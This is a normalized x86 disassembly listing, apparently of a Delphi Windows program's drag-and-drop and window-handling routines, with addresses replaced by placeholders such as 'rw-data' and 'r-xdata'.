mov eax [ rw-data ]
call sub_4188a0
mov edx edi
mov eax [ rw-data ]
call sub_418854
jmp r-xdata
sub_44d560
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44d5b8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40456c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_44c700
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44d618
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44d5b8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44d644
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_44d3a4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44d618
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44d560
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_456054
mov [ esi ] eax
sub_44d694
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44d560
cmp eax 0x1
sbb eax eax
inc eax
sub_44d6d0
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_454af0
test eax eax
je r-xdata
mov eax esi
call sub_454af0
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_44e100
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4189b0
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418a0c
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_454b04
mov edi eax
jmp r-xdata
sub_44d764
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_44d644
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_457b78
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_44d694
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_44d694
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_44f398
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_44d694
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d474
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457b34
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_44d6d0
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4034ac
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_457c60
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_457b78
jmp r-xdata
mov eax [ rw-data ]
call sub_457cd4
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d474
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_44f398
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4034ac
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4034ac
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407fac
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44da34
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44cc60
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_457b78
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_44d764
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_44dba4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_44dd49
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4034ac
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4034ac
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cf68
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44da34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ce50
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_456054
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_417330
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44f36c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_417330
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_44dd68
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4034ac
mov ebx eax
sub_44dddc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44e0a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44e036
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44cca8
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403460
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_44dd68
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_44d694
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_457cd4
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e03d
mov eax [ rw-data ]
call sub_4032b0
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_466768
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_450a20
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44d560
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_46a3d4
sub_44e03d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4032b0
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40343c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_44e0cc
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44c734
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44e100
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44e0cc
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_44f398
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_453940
test eax eax
je r-xdata
mov esi eax
sub_44e148
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418854
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx ] eax
sub_44e170
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418b4c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4032b0
xor eax eax
mov [ ebx ] eax
sub_44e190
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44e1c0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e270
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_44e249
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44e3fc
call sub_403b10
call sub_403b10
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4189b0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4254e4
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44e27c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418d74
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e31a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e321
mov eax [ rw-data ]
call sub_418dd8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44e2f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44e3fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425540
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4189b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4254e4
test al al
je r-xdata
sub_44e328
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_44e3fc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424dd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_44e354
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4256c4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4256c8
mov eax [ ebp - 0x4 ]
call sub_44e448
mov eax [ rw-data ]
call sub_418d74
mov ebx eax
xor eax eax
push ebp
push sub_44e3d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418dd8
retn
call sub_44e1c0
sub_44e3fc
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4256c8
mov edx ebx
mov eax [ rw-data ]
call sub_418d88
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_44e448
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44feb0
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_44e474
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_44e4b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419090
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44e4f8
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_44e5b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e681
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e688
lea eax [ ebp - 0x1c ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4034ac
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45ee88
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fe4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_404100
sub_44e6a4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44e70b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45bea8
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_44f854
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov edx [ eax + 0x64 ]
pop eax
